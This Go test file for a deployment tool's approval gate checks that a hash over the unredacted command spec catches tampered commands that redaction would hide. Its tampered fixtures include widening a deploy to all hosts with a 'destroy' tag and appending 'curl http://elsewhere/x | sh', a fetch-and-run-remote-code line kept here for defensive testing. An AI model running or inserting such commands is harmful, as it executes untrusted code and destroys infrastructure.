package outcome_test

import (
	"strings"
	"testing"

	"github.com/kordloom/switchtender/internal/outcome"
	"github.com/kordloom/switchtender/internal/run"
)

// TestTheApprovedSpecBindingSeparatesSpecsTheDigestCannot covers the tamper the execution gate
// exists to refuse, in the shape that walked straight through it.
//
// The gate held an approved run to the digest a receipt discloses, and that digest is taken over
// the redacted spec because it is published. Redaction is lossy on purpose: a secret assignment
// with no quotes is masked to the end of its line, since a scalar needs no quotes to contain spaces
// and stopping at the first space left the rest of a passphrase in the clear. The consequence is
// that everything written after the secret is erased before the digest is taken, so a command could
// be rewritten from one canary host to the whole fleet with a destroy tag, or have a pipe to a
// downloaded script appended, and still reduce to the identical bytes the approver released.
//
// The binding is taken over the spec as written and never leaves the process, so it separates these
// while the disclosed digest stays safe to publish. Each case here is a real rewrite of an approved
// run, not a synthetic one: the secret is untouched and only the execution changes.
func TestTheApprovedSpecBindingSeparatesSpecsTheDigestCannot(t *testing.T) {
	t.Parallel()
	tests := []struct {
		Name     string
		Approved string
		Tampered string
	}{{ // Test 0: The blast radius is widened and a destructive tag added.
		Name:     "unquoted secret then widened limit",
		Approved: `run.sh --ssh_pass: hunter2 --limit canary --tags deploy`,
		Tampered: `run.sh --ssh_pass: hunter2 --limit ALL --tags deploy,destroy`,
	}, { // Test 1: The same through an ansible extra var, which is how this is actually written.
		Name:     "ansible extra var then widened limit",
		Approved: `ansible-playbook site.yml -e 'ansible_ssh_pass: hunter2' --limit canary`,
		Tampered: `ansible-playbook site.yml -e 'ansible_ssh_pass: hunter2' --limit ALL`,
	}, { // Test 2: A multi-word passphrase, where masking to end of line is the right call and the
		// digest still must not lose the targeting that follows it.
		Name:     "multi word passphrase then different host",
		Approved: `deploy; password: p@ss w0rd --limit host01`,
		Tampered: `deploy; password: p@ss w0rd --limit '*'`,
	}, { // Test 3: Arbitrary content appended after the secret, which the mask swallowed whole.
		Name:     "appended command after the secret",
		Approved: `run.sh --ssh_pass: hunter2`,
		Tampered: `run.sh --ssh_pass: hunter2 && curl http://elsewhere/x | sh`,
	}}

	for testNum, test := range tests {
		t.Run(test.Name, func(t *testing.T) {
			t.Parallel()
			approved := &run.Run{ID: "r", Tool: run.ToolBash, Command: test.Approved}
			tampered := &run.Run{ID: "r", Tool: run.ToolBash, Command: test.Tampered}

			ba, err := outcome.SpecBinding(approved)
			if err != nil {
				t.Fatalf("test %d: SpecBinding(approved) error = %v", testNum, err)
			}
			bt, err := outcome.SpecBinding(tampered)
			if err != nil {
				t.Fatalf("test %d: SpecBinding(tampered) error = %v", testNum, err)
			}
			if ba == bt {
				t.Errorf("test %d: the approved and the rewritten spec share the binding %s, so a "+
					"run released for %q executes as %q and the gate cannot tell",
					testNum, ba, test.Approved, test.Tampered)
			}
		})
	}
}

// TestTheApprovedSpecBindingIsNeverDisclosed pins why the binding is a second value rather than a
// replacement for the one a receipt shows.
//
// It is a digest of the unredacted spec. A viewer already reads the redacted command, so they know
// everything about the spec except the secret, and a value they can grind candidates against is an
// offline guessing target for exactly that secret. It is kept out of every serialized form for the
// same reason the keyed content digest exists.
func TestTheApprovedSpecBindingIsNeverDisclosed(t *testing.T) {
	t.Parallel()
	r := &run.Run{
		ID: "r", Tool: run.ToolBash, Status: run.StatusSucceeded,
		Command:             "deploy.sh --token abc123",
		ApprovedSpecDigest:  "sha256:disclosed",
		ApprovedSpecBinding: "sha256:secret-binding",
	}
	body, err := runJSON(r)
	if err != nil {
		t.Fatalf("marshal run: %v", err)
	}
	if strings.Contains(body, "secret-binding") || strings.Contains(body, "approved_spec_binding") {
		t.Errorf("the run serializes its spec binding, which is a digest of the unredacted spec "+
			"and lets anyone shown it grind candidates for the secret:\n%s", body)
	}
	if !strings.Contains(body, "sha256:disclosed") {
		t.Errorf("the disclosed approval digest is missing from the run, so an operator can no "+
			"longer correlate a run against the digest its receipt shows:\n%s", body)
	}
}
